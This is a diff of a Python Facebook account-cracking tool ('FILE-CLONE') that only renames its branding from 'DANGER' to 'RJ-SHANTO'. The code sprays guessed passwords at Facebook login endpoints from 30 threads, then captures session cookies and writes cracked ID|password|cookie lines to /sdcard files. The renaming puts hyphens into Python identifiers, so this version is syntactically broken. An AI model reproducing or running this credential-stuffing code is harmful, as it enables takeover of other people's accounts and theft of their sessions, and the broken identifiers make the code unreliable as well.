@@ -1,8 +1,8 @@
 #!/usr/bin/python
 #Original written By Parvez Ahmed
-#DANGER(Parvez Ahmed Termux) Brand
+#RJ-SHANTO(Parvez Ahmed Termux) Brand
 
-#Feel DANGER POWER
+#Feel RJ-SHANTO POWER
 
 
 
@@ -35,7 +35,7 @@ except ModuleNotFoundError:
 
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as mogidDANGER
+from concurrent.futures import ThreadPoolExecutor as mogidRJ-SHANTO
 from string import * 
 from random import randint
 from time import sleep as slp
@@ -285,24 +285,20 @@ def randFBAN():
 
 def randBuildvsskj():
     END = '[FBAN/FB4A;FBAV/49.0.0.4120;FBBV/9006006;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/DANGER2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/RJ-SHANTO2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
-sys.stdout.write('\x1b]2; DANGER\x07')
+sys.stdout.write('\x1b]2; RJ-SHANTO\x07')
 S = '\033[1;37m'
 A = '\x1b[38;5;208m'
 R = '\x1b[38;5;46m'
 F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-logo ="""\033[1;32m
-d8888b.  .d8b.  d8b   db  d888b  d88888b d8888b. 
-88  `8D d8' `8b 888o  88 88' Y8b 88'     88  `8D 
-88   88 88ooo88 88V8o 88 88      88ooooo 88oobY' 
-88   88 88~~~88 88 V8o88 88  ooo 88~~~~~ 88`8b   
-88  .8D 88   88 88  V888 88. ~8~ 88.     88 `88. 
-Y8888D' YP   YP VP   V8P  Y888P  Y88888P 88   YD 
-\033[1;33m~~~~\033[1;32mD\033[1;33mA \033[1;34mN \033[1;35mG \033[1;36mE \033[1;37mR~~~\033[1;37m[X\033[1;37mD]
+logo =f"""
+\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
 \033[1;32m--------------------------------------------------------
 \033[1;37m[\033[1;31m•\033[1;37m]\033[1;31m  DEVELOPER    :   \033[1;31mNot Found
 \033[1;37m[\033[1;32m•\033[1;37m]\033[1;32m  TOOLS        :   \033[1;32mFILE-CLONE
@@ -322,10 +318,10 @@ def result(OKs,cps):
         print(' TOTAL OK: %s' % str(len(oks)))
         print(' TOTAL CP: %s' % str(len(cps)))
         print("-----------------------------------------------------")
-        input("Press enter to back DANGER Menu ")
+        input("Press enter to back RJ-SHANTO Menu ")
         exit()
 
-def DANGER():   
+def RJ-SHANTO():   
     os.system('clear')
     print(logo)
     print(f'[1] File Crack')
@@ -343,7 +339,7 @@ def DANGER():
     else:
         print('\n Select valid option ... ')
         time.sleep(2)
-        DANGER(allkey)
+        RJ-SHANTO(allkey)
         
 def method_crack():
     global methods
@@ -396,7 +392,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r\033[1;32m[DANGER] \033[1;33m{loop} \033[1;32m| \033[1;34mM1 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r\033[1;32m[RJ-SHANTO] \033[1;33m{loop} \033[1;32m| \033[1;34mM1 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -444,15 +440,15 @@ class main_crack():
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);DANGERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DANGERb};{ckkk}"
-                    print(f"\r{R} [DANGER-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RJ-SHANTOb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RJ-SHANTOb};{ckkk}"
+                    print(f"\r{R} [RJ-SHANTO-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/DANGER_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DANGER_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/RJ-SHANTO_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RJ-SHANTO_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
+                     #print(f"\r{A} [RJ-SHANTO-CP] {sid} | {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/DANGER_CP.txt','a').write(sid+'|'+ps+'\n')
+                     open('/sdcard/RJ-SHANTO_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -463,7 +459,7 @@ class main_crack():
     def methodC(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r\033[1;32m[DANGER] \033[1;33m{loop} \033[1;32m| \033[1;34mM2 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r\033[1;32m[RJ-SHANTO] \033[1;33m{loop} \033[1;32m| \033[1;34mM2 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -511,15 +507,15 @@ class main_crack():
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);DANGERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DANGERb};{ckkk}"
-                    print(f"\r{R} [DANGER-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RJ-SHANTOb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RJ-SHANTOb};{ckkk}"
+                    print(f"\r{R} [RJ-SHANTO-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/DANGER_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DANGER_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/RJ-SHANTO_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RJ-SHANTO_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
+                    #print(f"\r{A} [RJ-SHANTO-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/DANGER_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/RJ-SHANTO_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -529,7 +525,7 @@ class main_crack():
            
     def methodD(self, sid, name, psw):
         global oks,cps,loop
-        sys.stdout.write(f"\r\033[1;32m[DANGER] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+        sys.stdout.write(f"\r\033[1;32m[RJ-SHANTO] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
         sys.stdout.flush()
         fs = name.split(' ')[0]
         try:
@@ -547,14 +543,14 @@ class main_crack():
                 session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.80.89;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                 complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                 if 'c_user' in session.cookies.get_dict():
-                    print(f"\r{R} [DANGER-OK] {sid} | {ps} {S}")
+                    print(f"\r{R} [RJ-SHANTO-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/DANGER_OK.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/RJ-SHANTO_OK.txt','a').write(sid+'|'+ps+'\n')
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
-                    #print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
+                    #print(f"\r{A} [RJ-SHANTO-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/DANGER_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/RJ-SHANTO_CP.txt','a').write(sid+'|'+ps+'\n')
                     break
                 else:
                     continue
@@ -589,7 +585,7 @@ class main_crack():
             print(f'\033[1;34mCount Ids >> %s ' % len(self.id))
             print('\033[1;35mCracking Started >>')
             print("-----------------------------------------------------")
-            with mogidDANGER(max_workers=30) as DANGERworld:
+            with mogidRJ-SHANTO(max_workers=30) as RJ-SHANTOworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -599,16 +595,16 @@ class main_crack():
                        else:
                             pwx =  pw
                             if 'methodA' in methods:
-                                DANGERworld.submit(self.methodA, uid, name, pwx)
+                                RJ-SHANTOworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
-                                DANGERworld.submit(self.methodB, uid, name, pwx)
+                                RJ-SHANTOworld.submit(self.methodB, uid, name, pwx)
                             elif 'methodC' in methods:
-                                DANGERworld.submit(self.methodC, uid, name, pwx)
+                                RJ-SHANTOworld.submit(self.methodC, uid, name, pwx)
                             elif 'methodD' in methods:
-                                DANGERworld.submit(self.methodD, uid, name, pwx)
+                                RJ-SHANTOworld.submit(self.methodD, uid, name, pwx)
                    except:pass
             result(oks,cps)   
             
 
 
-DANGER()
+RJ-SHANTO()
